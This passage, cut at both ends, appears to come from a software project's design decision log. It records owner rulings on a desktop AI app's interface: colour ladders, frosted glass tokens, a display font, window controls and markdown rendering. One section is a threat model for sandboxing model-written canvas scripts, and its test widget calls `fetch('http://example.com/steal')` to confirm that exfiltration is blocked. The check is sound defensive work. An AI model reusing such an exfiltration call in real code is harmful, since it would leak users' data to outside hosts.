   `drawn`, `style`, `weight`, `icon`. Without it, exactly three, the minimum the invariant allows.
   And **tone cannot help**: `--surface-1` against `--surface-2` measures 7 units apart in dark and
   4 in light, both under the perceptual floor added with Decision 11. A pair sitting on the floor
   fails the next time anything else is quietened, which is precisely what Decision 11 asks for.
3. **The tab is the only thing carrying containment at far zoom.** Decision 11's own accepted-cost
   note says containment and persistence are what you need to spot when you cannot read anything.
   The cylinder carries persistence; the tab is all there is for containment.

**If the intent is a quieter module card, Decision 11 already licenses it** — a *smaller* tab is the
quieting this asks for and costs no channel. That is the change to make.

### Addendum 2 — the tab is quieter, and "shapes only when zoomed out" is measured impossible

**The tab shrank: `--arch-tab-w` 32→24, `--arch-tab-h` 12→8.** That is the quieting Decision 11
licenses, and it costs no channel — `drawn` is categorical in the greyscale scorer, so a smaller tab
separates module from service exactly as a larger one did. Re-probed after the change: **48/48**,
including the firewall.

**"Zoomed in the drawn channel collapses; zoomed out the tab returns" cannot be built, and the floor
added with Decision 11 is what forbids it.** Probed by setting every kind's `drawn` to `none` — the
reading-zoom state that proposal describes:

```
store vs agent differ only in [silhouette, icon]     → 2 channels, one short
```

Agent's only separator from store besides its outline is the **chamfer**, which *is* the `drawn`
channel. Both are `solid`, both are `--w-struct`, and their tones — `--surface-2` against
`--surface-3` — measure **10 units apart in dark**, under the 12-unit perceptual floor. Collapse the
drawn channel and the pair falls to two.

So the same ruling both approved the floor and asked for a collapse the floor forbids. **The floor
wins**, on the reason it was added for: two values that resolve differently and land within a few
units are one channel wearing two names, and a pair separated by a difference nobody can see is not
separated.

**A narrower version is legal and is declined for the reason already recorded.** Collapsing only
*module's* tab passes (35/35), because module keeps `style` and `weight` against service — but that
is simply removing the tab, which Addendum 1 declined for putting the pair on the floor. It is also
not "shapes only when zoomed out"; it is "one kind's shape, only when zoomed out".

**What the ladder actually does, and it is the opposite way round.** `board.css` records it: the
silhouettes separate *at size* and stop separating below half a card, where the tab paints 4px and
the icon becomes the carrier. Shapes are the far-zoom carrier only down to a floor — they are not
suppressed at reading zoom and restored beyond it.

## Decision 12 — the owner's walk of 2026-09-13: lighter ground, purple forward, glass, larger controls, one door, native prose, no title bar

**Owner ruling, 2026-09-13, from a walk of the running app with screenshots.** Verbatim, the parts
that bind:

> "the chatbox isn't contrast enough … more glass, more frosted and bigger buttons please … the
> black app is a little hard on the eyes at the moment, I want a lighter gray. I like the purples
> and can we accentuate that more and more … have set rules for set buttons and settings so that
> we don't dump information in people's faces — in teach mode when you choose one of the three
> options they stay in your face … settings is both bottom left and top right … like ML Harness and
> Claude, where you don't have this big top bar, the window is stretched … have paths show up the
> same as ML Harness, path under textbox, next to mode selection … for the top bar chat / arch /
> whiteboard / canvas, have an X to close them after they open up like Chrome tabs … the chat isn't
> native to the model's output language and it prints the direct output in code as well as the
> titles ('#', '<') … the side rail is a little loud, use font sizes and contrast colors instead of
> big surrounding borders around sections, projects and so on."

Each clause is one change, and each change names this decision in the file it lands in.

### What changed, and where the sheets are amended by it

1. **The dark ground lifts off black.** `--bg-ground #08080A → #1B1B1F`, `--bg-base #0D0D0F →
   #202025`, and the four surfaces rise with them keeping Decision 11's measured intervals
   (6 / 10 / 10 units), so nothing the greyscale invariant guards moves relative to anything else.
   `--ink-4` and the three edges lift one step for the same reason: a hairline drawn for a black
   ground was not a hairline on a grey one. *Amends sheet 39's dark values.* Light is untouched and
   Decision 1 still defers it.

2. **The accent moves toward violet and up in value.** `--accent #8E8AF2 → #A79EFF` (7.0:1 on
   `--bg-base`), `--accent-solid #6C63E0 → #6E62EB` (white on it holds 4.5:1, where the old solid
   sat). `--state-selected` becomes an accent wash rather than a white one: a selected row is the
   product's own voice, and grey said nothing. Law 1 is untouched — the hue budget is the same five
   verdicts and one accent; the accent is simply louder where it already was.

3. **Glass is a token, derived once.** `--glass`, `--glass-pane`, `--glass-edge`, `--glass-blur` in
   `tokens/graphite.css` §3, each a `color-mix` of an existing surface — never a hand-mixed alpha in
   a sheet. Spent on the composer, the workspace pill bar and popups; **not** on rows. The 2026-08-05
   ruling that banned `backdrop-filter` was a ruling about *v1's* product tree, which is deleted; this
   is the first Graphite-era ruling on the question and it goes the other way, on the owner's word.

4. **A second control rung.** `--control-h-lg: 32px` and `--icon-btn-lg: 30px` beside the 28/26
   ladder. The 28/26 rung stays for rows and dialogs; the large rung is for the controls a person has
   to FIND and PRESS — send, plus, model picker, workspace pills, new chat, the teach cards. The
   firewall still refuses a raw 30 / 28 / 26 in any sheet; the new rung is a token like the old one.

5. **One settings door.** Decision 5 put the gear at the bottom of the sidebar. The app bar's
   `More` group still offered Settings as a second door, and the owner met both. `More` now holds
   Runs and Rewind only; the palette still reaches settings by name. `Shell.test.tsx` asserts the
   second door stays gone.

6. **The teach cards fold once answered.** "New to it / I've used it / I ship this" collapse to one
   chip naming the choice with a `change` affordance; pressing it unfolds the three, with the chosen
   one still marked so the un-click rule holds. The fold is view state in the component, never in the
   store: what the lesson skips is a fact about the learner, whether the cards are open is a fact
   about this screen.

7. **The path under the box.** The under-composer line is left-aligned and reads: mode, then
   `grounded on <name>` with the repository root beside it in mono, ellipsised at the drive end so
   the folder survives. Nothing is drawn when there is no repository.

8. **Workspace views close from a ×.** Each open pill carries a close button with one meaning —
   hide this view — beside a label that already carried three. The last open view refuses out loud
   (`role=status`), as the capacity refusal does. Pills sit on the large rung at `--t-13` and wear
   the accent wash when on.

9. **The transcript is markdown-native.** `proseBlocks.ts` moved the line: headings, lists,
   `**emphasis**` and `<details><summary>` render as what they are; fences stay literal and win over
   everything; a paragraph is a list only when EVERY line is an item, so a diff hunk stays a
   paragraph. Quotes and tables are still refused. The file header carries the argument and the one
   accepted cost (a removal-only hunk pasted outside a fence reads as a list).

10. **No native title bar.** `packages/desktop` hides it (`titleBarStyle: 'hidden'`, window
    controls as an overlay on the 44px line, `hiddenInset` on macOS); `.shell-appbar` is the drag
    region, every control in it opts out, and the bar's right padding steps aside by
    `env(titlebar-area-*)` — zero in a browser tab.

11. **The rail separates by type and ink, not by boxes.** Group labels (`GENERAL`, a repo's name)
    lose their fill and border and drop to `--t-10` at `--ink-4`; rows rise to `--t-13`; the rail's
    own edge drops to `--edge-faint`; New chat is a filled button on the large rung.

### Deferred from the same walk, named so it is not lost

- **The canvas draws natively and at once, tldraw-style, and the person can select a drawn part and
  ask about it.** The owner's own sequencing (same day): build it "off of" this batch, "after the UI
  and UX and formats and template and application is working and ready". It is the next program,
  owned by the AI-canvas lane, and it starts from a working substrate rather than alongside one.

### Addendum, 2026-09-13 evening — the owner walked the installed build, and eight of these are corrections to the morning's work

He ran the packaged app, not a dev server, and the notes below are from that. Where a clause corrects
something recorded above, it says so; the earlier entry is left standing so the reversal is legible.

1. **The window buttons are OURS.** "On ML Harness we did a really good job with the way we were able
   to use the minimise, close, expand within our application. Right now it doesn't look as good."
   Clause 10 above shipped `titleBarStyle: 'hidden'` + `titleBarOverlay`, which hides Chromium's frame
   and then asks Chromium to paint the SYSTEM buttons over our bar — platform glyphs at platform
   metrics on a rectangle we may only colour. ML Harness is Tauri with `decorations: false` and draws
   its own; that is the whole difference. So: `frame: false`, and `shell/WindowControls.tsx` draws the
   three through the existing `sequence:shell` channel. **Amends clause 10.** macOS keeps
   `hiddenInset` — its traffic lights are muscle memory and already sit inside the window.

2. **Three glyphs enter the book.** `ic-win-minimize`, `ic-win-maximize`, `ic-win-restore` in
   `graphite/_core.html`. Graphite has no window chrome because it never drew an application that
   owned its own frame; `test/icon-book.test.ts` refuses any name the book does not define, which is
   the mechanism that made this a decision rather than an edit. Named after the VERB, not the shape.

3. **`--wont` marks the close button on hover, and only there.** Every platform marks it; a close
   button that looks like its neighbours is a mis-click that loses work. It is the one place that hue
   says something about the PRESS rather than about the repository, and law 1 is bent out loud here
   rather than quietly in a sheet.

4. **One settings door, again.** "Settings is both bottom left and top right." Clause 5 removed the
   `More` entry that morning; the same day's merge with main added a gear to the app bar with the
   removed menu bar's contents. The count never dropped. The gear is off the bar; `Application` is a
   pane in the panel the sidebar gear opens. **Completes clause 5.**

5. **The under-composer rail is ONE line and never grows a second.** "It shouldn't stack multiple
   different elements, it should all be within one element directly … it shouldn't keep lifting the
   chat box bar." The teach chips sat OUTSIDE `.undercomposer-inner` and opened a second row, so
   choosing a mode moved the box being typed in. The three are inline chips on the mode's own line
   now, hints moved to their tooltips. **Amends clause 6**, which folded them but left them stacked.

6. **Purple marks what was chosen.** "When you select teach mode it should be purple. The model
   picker should be purple. Use that colour more, don't be scared to use it." `--accent-wash` +
   `--accent-edge` on the teach trigger and the model picker. Still zero verdict budget spent: these
   say "you are in this mode", never good or bad.

7. **The model chip says the NICKNAME.** "When you add a nickname to a model, in your chat box it
   should show the nickname, not the model direct signature." The rows were read at menu-OPEN time by
   a documented decision; the trigger has to name who is answering before anyone opens anything, so
   there is now one read on mount. The wire id stays one hover away, and a nickname sets in the UI
   face where an id keeps mono — reading which one you are looking at is the point.

8. **The rail has two rungs, not three.** "The chats are also too big … the file titles, like
   sequence, general, those should be as big as the chats", with the morning's "Sessions and Search
   should be smaller than New chat and the current chats". So: `--t-11` for the fixed doors, `--t-12`
   for the work — New chat, every thread, AND the titles over them. **Amends clause 11**, which had
   put the titles at `--t-10` and the rows at `--t-13`. Case, mono and ink separate a title from a
   row now; size does not.

9. **A slash between two words is emphasis, not a path.** `**Input/Request Stage**` and
   `**Read/Write Mix**` printed their asterisks in a list where every neighbour without a slash
   rendered bold. Clause 9's parser banned `/` inside the pair to protect globs and caught ordinary
   English. The guard is now `[^*\n]` plus markdown's own no-edge-whitespace rule, which refuses
   every glob the slash ban refused and no English. **Amends clause 9.**

10. **Teach mode could not draw with no repository attached, which is the state a learner starts in.**
    "It didn't draw anything after I literally asked it to draw … so we're kinda losing that
    advantage." Measured: `buildConceptChart` needs a graph, `buildPlot` needs an expression,
    `buildExamplePlot` needs a maths topic, and `drawFromGeneralKnowledge` — the function written for
    "a learner asks what is machine learning and gets the architecture DRAWN" — was gated on
    `subjectNotInRepo`, which `buildTeachContext` sets ONLY when a graph exists. Every path closed at
    once. The gate asked "is the subject missing from the repository?" where it needed "did anything
    else manage to draw?". Now it also fires with no graph at all.

### Everything the owner raised on 2026-09-13, and where it landed

- **A lesson that asks for a picture gets one, and it is not a design brief.** **Done 2026-09-14.**
  The diagnosis on record blamed `ASK_SHOW_ON_BOARD_CLAUSE`; a test built from the owner's actual
  words says that clause never fired. "show me how attention works" matches `isFigureItOutAsk`
  ("State 3–5 numbered assumptions … then CALL `propose_topology`"), and "explain how" / "walk me
  through" / "components of" match `prefersSeqdDiagramAsk`, which flips the whole greenfield stack.
  `AskComposition.teach` now carries into the prompt builders — which had never been told, while the
  BELT builder always had — and one teach clause replaces all three.
- **The agent can SEE the canvas.** **Done 2026-09-14** — `surface.canvas` on the wire, blurry for
  every block and focused for the newest, plus `blockId` on all five writers so a revision replaces
  in place. Stage 3 of `docs/research/agent-drawing-and-teaching-visuals.md`.
- **A visible work list for a job of several steps.** **Done 2026-09-14** — `update_todos`, carried
  into every later round's prompt above the (droppable) evidence ledger, with a completed step
  resetting the unproductive-round counter. It executes nothing and `todoList.ts` says so.
- ~~**The teaching JOURNEY.**~~ **Done 2026-09-14.** Three of the four beats had shipped
  (`TeachKnownCards`, `propose_chart`, `checkIn.ts`); the fourth — walk one real input through the
  picture — is `walk_example` + `TeachWalk.tsx`. Both open questions were settled by machinery that
  already existed: the picture stays a canvas pane (`chart:proposal` has painted there since the
  teach contract shipped), and a beat is a MOVING HIGHLIGHT rather than a redraw, because
  `teachStep.litNodeIds` already lights parts and a redraw per beat would cost a provider round per
  beat. A walk may only name parts of the chart the turn actually drew; one invented id voids the
  whole walk.
- ~~**Thinking vs output ink.**~~ **Done 2026-09-14.** It meant the streaming answer text, and there
  was a defect under it: local models put reasoning inline in `<think>` tags (`provider.ts:199`
  measured 316 characters of it on one granite turn) and nothing on the client looked for them, so
  the tags printed into the answer. Split, ordered, and set in `--ink-3` — measured 4.90:1 against
  the answer's 13.65:1. `--ink-4` was tried and is 2.85:1, below AA, which would have made
  "separated, not hidden" a claim the screen does not honour.
- ~~**Opening a repo should not take over the screen**~~ **Done 2026-09-14** — a scrim dims for a
  DECISION, not for navigation, so `attach` no longer darkens the app. Only the dim: click-outside,
  focus trapping and Escape are untouched. ~~**and clicking a repo's chat should attach it**~~ was
  already wired (`attachRepoSession`, `SessionsPanel.onOpenRepoSession`).

**Nothing from the owner's 2026-09-13 walk is open.**

## Decision 13 — Sora is the display face, and only above `--t-15`

Owner, 2026-09-14, from a tweet of four "premium free" faces: *"sora is really clean and lets see
if we can add that anywhere."*

**Two of the four were not free, and that is worth recording** so nobody reaches for them later.
`@fontsource` packages open-licence faces only, which is the fastest test there is:

| face | licence | shippable |
|---|---|---|
| **Sora** | SIL OFL — `@fontsource/sora` | yes |
| **Apfel Grotezk** | SIL OFL — `@fontsource/apfel-grotezk` | yes |
| Neue Montreal | Pangram Pangram — free for **personal** use only | no |
| Aktiv Grotesk | Dalton Maag — commercial | no |

### "Anywhere" is not everywhere, and the measurement says where

Measured on this repository's own strings, at this repository's own sizes, before anything was
placed — because `graphite.css` records that Instrument Sans was chosen over Inter specifically
for holding its shape at the 10–11px working sizes, where "different advance widths mean different
truncation and a different column fit":

| string | size | Instrument Sans | Sora | |
|---|---|---|---|---|
| `packages/analyzer/src/server/askPipeline.ts` | `--t-11` | 219.1px | 242.1px | **+10.5%** |
| `Sessions` | `--t-11` | 44.3px | 49.9px | **+12.6%** |
| a sentence of answer prose | `--t-13` | 274.0px | 307.4px | **+12.2%** |

**Sora is 10–13% wider at every working size.** As the UI face it would truncate rail paths and
tool rows ~11% sooner across the whole product — failing the exact test Instrument Sans was picked
to pass. So it is not the UI face and must never become one.

### Where it goes

A new `--font-display` token, used at **`--t-17` and above only** — the places with room to
spare, where nothing truncates and character earns its place:

- `.boot-title` / `.startup-title` (`--t-20`)
- `.prose h1` (`--t-20`) and `.prose h2` (`--t-17`) — the headings of an answer
- `.v3-rail-title` (`--t-17`) — sessions rail “Chats”
- `.v3-overlay-panel .settings-title` (`--t-17`) — Settings overlay
- `.ctxring-panel-title` (`--t-17`) — context-ring breakdown heading

`h3` at `--t-15` and everything below stays Instrument Sans: those sit among the body, where the
wider advance costs the line. **One weight ships (600)**, because headings are the only thing this
face sets, and cuts nothing renders are bytes in the bundle for nothing.

Self-hosted through `@fontsource` like the other two, so first paint still touches no network and
`packages/web2/test/boot.test.tsx`'s zero-requests-to-Google-Fonts assertion still holds — the local-first
non-negotiable is unmoved.

**Hue budget: unchanged (0).** A typeface is not a claim about the world, so this spends nothing
against law 1.

## Decision 14 — glass is a material, the chosen purple is lighter, and the tab bar comes down a rung

Owner, 2026-09-14, walking the installed build: *"the top chrome tab like buttons are MASSIVe and a
little too big, and the purple re a little too dark, add liquid glass button for a lot of things,
and from there use more transparency but MORE COLOR."*

### The tab bar was overcorrected, and by this book

Decision 12 raised the six workspace pills off a 24px chip because "primary navigation is not a
chip". That was right and it overshot: `--control-h-lg` (32px) at `--t-13` put the six largest
controls in the app in one row across the top. They are now `--control-h` (28px) at `--t-12` — the
rung every other control in the chrome already sits on, and still well above the `--t-10` badge rung
the original audit rejected. **Amends Decision 12's sizing of `.shell-wpill` only.**

### Lighter, not shallower

The dark block's own comment carries his earlier ruling: *"I want a deeper purple, more opaque than
transparent … when you click it becomes opaque and frosted and a darker purple."* This is a
refinement of that call, not a reversal — `--accent-chosen` is still a FILL and still more opaque
than transparent; it is mixed toward the light accent (`#9D8CFF`) instead of sitting near the solid
(`#5A4BE6`), and `.82 → .72` lets the blur behind it do the glass work.

| | before | after |
|---|---|---|
| `--accent-chosen` | `rgba(103,82,226,.82)` | `rgba(124,105,245,.72)` |
| `--accent-chosen-edge` | `rgba(167,152,255,.74)` | `rgba(178,165,255,.80)` |
| ink-1 on the chosen fill | 6.01:1 | **5.32:1** — measured, still above AA |

### Glass is a material, so it is defined once

Five tokens (`--glass-ctl`, `-hover`, `-hi`, `-edge`, `-blur`), one CSS block, a list of selectors.
Four buttons with four hand-tuned frostings drift the first time one is edited, and the thing that
makes glass read as one material is that every pane of it *is* one material.

**What makes it glass rather than a translucent rectangle**, in order: a fill thin enough that the
ground reads through; a backdrop blur so what reads through is softened rather than legible; a **top
highlight**, because light falls on the top edge of a physical pane and without that inset hairline
the control is a smudge; and an accent-tinted rim so the colour reaches the edge.

`--glass-ctl-blur` is 10px, not `--glass-blur`'s 18px: a 28px control blurred at 18px samples most of
what is under it and goes flat.

**Two controls are deliberately NOT glass.** Send stays solid — it is the one ACTION on that surface
rather than a place to go, and putting it in the same material as its neighbours erases the
distinction it exists to make. A disabled button loses the highlight and the rim, or "cannot press
this" reads as "press this".

### The hue budget is unchanged: 0 added

Law 1 counts **hues**, not surfaces. This is the indigo already on the roster, spent on more of them
— which is Decision 12 clause 6's standing instruction ("use that colour more, don't be scared to
use it") applied to the chrome. Still never a verdict.

**The limit that stays:** `backdrop-filter` costs a compositing layer per box. Glass goes on the
chrome's fixed, small set of controls — never a list item, never a transcript row.

## Decision 15 — the canvas may run scripts, behind two guards

Owner, 2026-09-14: *"i allow scrits in sandbox"*.

`docs/research/agent-drawing-and-teaching-visuals.md` §4 refused to slip this in: interactivity *"is a
security decision first"*, and moving the boundary *"should be written down as a decision with its
threat model, not slipped in"*. This is that write-up.

### What changed

`AiCanvasBlockBody`'s HTML frame goes from `sandbox=""` — the most restrictive possible value — to
`sandbox="allow-scripts"`. `canvas.write_html` can now produce a slider, a play button, a stepper, a
`<canvas>` animation: the interactive explanations every one of his six reference images actually is.

### The two guards, which matter more than the flag

**1 · `allow-scripts` WITHOUT `allow-same-origin`, always.** Those two together are not a weaker
sandbox, they are **no** sandbox: a frame holding both can reach its own `<iframe>` element through
`window.parent` and strip the attribute. Alone, `allow-scripts` gives the frame a unique opaque
origin — no parent DOM, no host cookies, no host `localStorage`, no same-origin fetch. The omission
is the boundary, so `canvasSandboxFrame.test.tsx` asserts the rendered attribute is exactly
`['allow-scripts']` and nothing else.

**2 · A CSP that forbids the network.** The real risk of model-authored JS here is not a defaced box,
it is **exfiltration**: a script reading the lesson and POSTing it somewhere. Every interactive
document carries `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src
data:` — every fetch, XHR, WebSocket, form post, font and frame closed; inline pixels still work. The
widget may compute and draw. It may not phone home.

The hole that had to be closed with it: `htmlSandboxDocument` used to return a model-authored
`<!DOCTYPE …>` untouched. Harmless while nothing ran; with scripts on it is the one input shape that
skips every guard, and the one a model reaches for when asked for "a complete page". The meta is now
injected as the **first child of `<head>`** — a CSP meta is ignored once a resource is declared above
it — and a document with no head is re-wrapped rather than trusted.

### Measured, in a real browser, not asserted

A widget with a slider and a `fetch('http://example.com/steal')`, in a frame carrying the real
attributes: `{ ran: true, net: "blocked", parentReachable: false }`. Scripts execute; the network is
closed; the host document is unreachable.

### What is NOT claimed away

A script can spin forever, and a sandboxed `srcDoc` frame may share the tab's event loop — a hostile
or buggy widget can make the tab unresponsive until the block is closed. That is the honest remaining
cost of the flag. `canvas.write_svg` and `canvas.write_react` are unchanged and still script-free;
`sanitizeHtmlForSandbox` still strips, because a function whose job is to strip must not stop because
some *other* caller was allowed to run them.

## Decision 16 — the room, the material, and six hues that name a surface

Owner, across 2026-09-14: *"it looks like a massive grey film everywhere over the site"* · *"im still
not seeing real liquid glass on any buttons anywhere no frosted glass"* · *"TTOO MUCH PURPLE HUE
EVERYWEHRE, more darker charcoal"* · *"more colors like yellow, blue, any colors similar to stuff
like purple on the rainbow index"*.

### Why Decision 14's glass never read, measured

`backdrop-filter` blurs what is BEHIND an element. Measured in the running app: behind every frosted
control sat one uniform fill, `background-image: none`, all the way up to `body`. **A blur of a
uniform colour returns that same colour.** Every frosted control shipped by Decision 14 was a flat
translucent tint performing a blur with no visible result.

Three things were missing, and all three are now in `--glass-ctl-*`:

1. **A room.** `--ground-wash` — four faint fixed lights on the shell, so the blur has something to
   refract. `fixed`, because a wash that scrolls reads as an object on the page and one that sits
   still reads as the room the page is in.
2. **Saturation.** A plain blur greys what it samples and reads as fog; `saturate()` pulls colour
   through, and is the single largest reason a pane reads as glass.
3. **Thickness.** Decision 14 shipped a top highlight alone. A bottom inset says the pane has depth;
   a highlight without one is a sticker.

**And the material is NEUTRAL, which was the correction that made it work.** The first pass tinted
every control with `--accent`, so the tint was what you saw *instead of* the material — that is what
"too much purple" looks like. Apple's material is the other way round: a neutral scrim, all of its
colour borrowed from behind. Controls now change hue as they move across the app, which is what glass
does and a tint cannot. Blur is 20px, not 10: at 10px the *shape* behind still reads, which is a
translucent window rather than frosted glass.

**The recipe's selectors are doubled** (`.shell-btn.shell-btn`). Not cargo-cult: this file is imported
before every scoped stylesheet, so a plain rule here loses on order — which is exactly what happened
on the first attempt, green build and all. Doubling wins by construction.

### The ladder was a film, and it was measured as one

Steps were 5 / 7 / 6 / 10 / 10 in hex — under ΔL\* 3.5 where panes abut, which is below what a
hairline can rescue, so three stacked panes read as one. Solved for **ΔL\* ≈ 7** at the low end, with
a blue-violet cast (B ≈ R+13) because a near-neutral ramp is what makes a dark UI read as dead grey.

The inks moved with it, measured rather than eyeballed: `--ink-3` had fallen to 3.82:1 on the lifted
`--surface-2` and the contrast gate caught it. `--ink-3` → `#A1A2B1`, `--ink-4` → `#82838C`, and
`--info-bright` exists because the on-path dot composited to 2.91:1 on a dimmed card.

### Sizes: doors, and two reversals

- A new rung, `--control-h-door` (36px), for the fixed **entrances** — Sessions, Search, New chat,
  Settings, a settings pane tab. `--target-min` is a hit-area FLOOR and was never a size to reach for.
- The workspace tabs come DOWN a rung (`--control-h`, `--t-12`). **Amends Decision 12**, which raised
  them off a 24px chip and overshot: six of the largest controls in the app in one row.
- The mode trigger comes down the same rung. **Amends the 2026-09-13 walk.** Its 24px floor — the
  thing that test is actually for — is untouched.
- The session row you are in is **darkened**, not purple. **Reverses** the earlier "deeper purple"
  ruling for this row, and its guard was updated to keep the property it exists for (filled, never
  outlined) while letting the token move. Hover sinks toward the ground for the same reason: a white
  scrim LIGHTENS a row, and over a violet wash a lightened row reads purple.

### Six hues that name a surface

`--surface-hue-{chat,architecture,whiteboard,ai-canvas,terminal,browser}` — violet, blue, cyan,
yellow, green, pink, walked round the wheel from the accent.

**This is identity, not decoration, and that is the only reason law 1 permits it.** A hue here makes
no CLAIM; it says WHICH surface, exactly as the three mode hues say which mode. A reader learns
"Architecture is the blue one" and stops reading six labels. Used at **wash strength only** — rim and
glyph — because a filled tab would read as six different controls and the strip would stop being a
strip. None is a tone hue, so none can be mistaken for a verdict.

## Decision 17 — charcoal, and colour only where it means something

Owner, 2026-09-14, on the built app: *"the random hue everywhere is so bad. I just want a clear
charcoal gray light background, codex like … purposeful colors, liquid glass everywhere … Purple hue
only on, like, buttons and stuff, not entire sections or cards or huge things."*

### The rainbow was mine, and it was a workaround

Decision 16 put four coloured lights on the ground because `backdrop-filter` has nothing to blur over
a flat fill. That diagnosis was right and **the fix was wrong.** Glass does not need coloured light;
it needs contrast between the pane and what is behind it, a specular top edge, and depth — all of
which are neutral. `--ground-wash` is one soft vertical lift now, the way a lit room falls off.

### Where colour is allowed to go, and nowhere else

> a **button** the person presses · a **selection** — the thing they picked · a **tool's** own state

Not a section. Not a card. Not a pane. Not the ground. A hue on something large is decoration; on
something you press it is information. **Amends Decision 16**, which spent the accent on every
control's fill and every tab's rim at rest.

### The ladder is charcoal, and lighter

Near-neutral (a 3-point cool lift, not 13), and up about six L\* points across the board, because
"codex like" is a *lighter* dark theme than we had. Measured, and the inks moved with it:
`--ink-3` → `#AEAFB6`, `--ink-4` → `#8D8E93`, and `--unknown` → `#9E9FA7` after
`activityRendered.test.ts` caught "Interrupted" at 4.35:1 on the lifted pane.

The composer is `--surface-1` under its scrim rather than a white scrim alone — *"in the chat box, we
shouldn't be like a dark black, just a lighter gray."*

### Six tab hues become three

Purple, pink, navy — *"should be, like, purple, pink, and that's about it, and maybe a bit of, like,
darker navy blue."* Six across six tabs was a rainbow; three is a family, and a family reads as a
decision where six reads as spam. **A tab at rest is now neutral glass**: the hue is the reward for
being the chosen one, not a coat every tab wears at once.

### The selection reversal, stated plainly

The loaded session row has been three ways: `--accent-chosen` (a slab), then `--bg-ground` (dark),
now `--accent-wash` (a tint). All three of his readings are consistent once the distinction is drawn:
**a selection may carry the accent, and the fault was never the hue — it was the weight.** A slab at
.72 reads as a coloured block; a tint at .16 is something the row shows through. A *picked* row in a
multi-select keeps depth, because where you ARE and what you have GATHERED are different states.

### Hover

One shared transition and a 1px lift, released on `:active`, off under `prefers-reduced-motion` —
*"button should be clear, clickable, cool hover animation."* A control that lifts and never returns
reads as broken rather than as pressed.

## Decision 18 — Draft A · Native: charcoal room, frosted glass kept

Owner, 2026-09-14, after the three redesign drafts and a walk of Decision 17's lighter ladder:
*"go with option A — the native one with glass and frosted glass on buttons, but more contrast
instead of a light gray film to darken the bck a bit everywhere."*

### What was picked

**Draft A · Native** (`docs/research/ui-drafts/draft-a-native.html`): OS-restraint chrome, vibrancy
doing the work, frosted glass on controls, one accent spent only on the thing pressed or picked.

### What Decision 17 overshot

Decision 17 lifted the dark ladder toward "Codex-like" light charcoal
(`#232427` / `#2E2F33` / surfaces through `#5D5E61`). That cured near-black, then became the **light
gray film** the owner named — panes still stepped, but the room itself washed out so glass and ink
had nowhere to contrast against.

### What ships

1. **The room darkens to Draft A's measured charcoal.** `--bg-ground #131418`, `--bg-base #1A1C21`,
   surfaces `#212328` → `#3E4046`, steps kept (~ΔL\* 6–7 where panes abut). Near-neutral with a
   3-point cool lift — still charcoal, not a hue claim.
2. **Ink follows Draft A's ramp** (`#F4F5F8` / `#B5B7C1` / `#93959F` / `#74767E`) so body text and
   marks clear the same floors the draft measured against those grounds.
3. **Frosted glass on buttons is kept**, not thinned. `--glass-ctl` stays `.13` / `.20` hover with
   blur + saturate + top highlight + bottom thickness (Decisions 14–17). Darkening the ground
   *widens* the pane/ground gap; thinning the fill would re-open the "hairline on the background"
   failure Decision 17 closed.
4. **`--ground-wash`** is a corner light plus a soft vertical lift (still neutral, still fixed) so
   `backdrop-filter` has something to bend on the darker base.

Colour rules from Decision 17 stand: accent only on a press, a selection, or a tool's own state.
Drafts B and C remain reference; they are not the product direction.

## Decision 19 — Cursor/Codex blue-black room (less chalk grey)

Owner, 2026-09-14: *"the greys seems to be overpowering, use more cursor and codex style
coloring"* — and separately, side-rail glass buttons were failing while chrome workspace
tabs looked right.

### What ships

1. **Room shifts from neutral charcoal to blue-black** (`#0c0e14` / `#12151c`, surfaces
   `#181c26` → `#2f3646`) with slate edges (`rgba(148,163,184,…)`) so the field reads like
   Cursor/Codex, not a flat grey film.
2. **Glass fills cool off** — ctl/pane use slate tint instead of chalk white alpha, so frost
   borrows the blue room instead of milking grey over it.
3. **Rail controls match chrome tabs** — New chat and hover acts are quiet at rest; permanent
   frosted squares + blur over a scrolling rail are retired (blur stays on chrome pills /
   hover only, where it already works).
4. **Session switch soft-loads** the transcript in-app (no full-page reload / repo isolation)
   so each chat stays its own thread while navigating.

> **Superseded for the ROOM by Decision 20.** Soft-load sessions and chrome-tab
> rail controls remain. The blue-steel grounds, slate edges, and coloured
> `--ground-wash` do not.

## Decision 20 — macOS liquid glass on Graphite (near-black / gray room)

Owner, 2026-09-14, correcting Decision 19 and the hue churn:

- Cursor is **dark black with gray**, not navy / purple-blue steel.
- Codex is **gray with white** structure — not a chalk film, not a blue room.
- *"don't use hues"* / *"refer to the brand book"* — macOS **liquid glass** material
  language on **Graphite** laws, not a new palette every pass.

Canon for agents: `docs/brand/MACOS-GRAPHITE-MEDIUM.md`.

### What ships

1. **Room returns to Draft A near-black / gray** (Decision 18 ladder): `--bg-ground
   #131418`, `--bg-base #1A1C21`, surfaces `#212328` → `#3E4046`. Neutral white-alpha
   edges. Decision 19 blue-black + slate edges are retired.
2. **`--ground-wash` is neutral only** — soft vertical / corner lift so glass refracts;
   no violet/cyan/indigo decorative lights in the room.
3. **Glass stays frosted and neutral** (Decisions 14–18): white-alpha `--glass-ctl`
   `.13` / `.20` hover, blur + saturate, balanced hi/lo inset. Cooler slate glass from
   Decision 19 is retired.
4. **Accent = Graphite indigo only on press / selection / Send / tool-own state.**
   Tab identity is label + glyph — do not spend `--surface-hue-*` as chrome colour.
5. **Rail controls keep the chrome-tab recipe** from Decision 19 §3 (quiet at rest;
   no permanent frost on scrolling chips). Session soft-load stays.

Colour rules from Decision 17 stand. Draft A Native remains the layout/material
reference. Decisions B/C drafts remain non-product.

## Decision 21 — Draft V3 Graphite is the product chrome source of truth

Owner, 2026-09-14, after reviewing Draft V3 (`docs/research/ui-drafts/draft-v3-macos-harness.html`)
with the **Graphite** skin selected:

> Graphite V3 is literally perfect — new source of truth; implement product-wide;
> don't ruin the logic; full redesign/reskin; the old design can go.

### What ships

1. **Visual SoT = V3 Graphite skin** — Apple-first harness *structure/material*,
   Graphite *tokens*. Not Draft A alone; not Decision 19 blue-steel; not
   hue-churn re-skins.
2. **Logic unchanged** — soft-open catalog, soft-load session switch, attach/
   browse, chat/tools/composer behavior, Decision 5 layout (sessions | chat |
   board). Chrome and materials only.
3. **Token recipe** (dark): V3 thinner frost (`--glass-pane` / `--glass-pane-fill`
   `.055`, ctl `.075`/`.095`, blur pane/bar/input `24`/`20`/`18`, sat `1.8`),
   dual-radial + ladder `--ground-wash`, `--accent-wash` `rgba(124,108,245,.16)`,
   `--accent-ink` `#B8AEFF`, `--user-bubble` for user bubbles. Accent still only
   on press / selection / Send / tool-own state.
4. **Old chrome look is retired** — thicker Decision 14/16 glass fills, flat
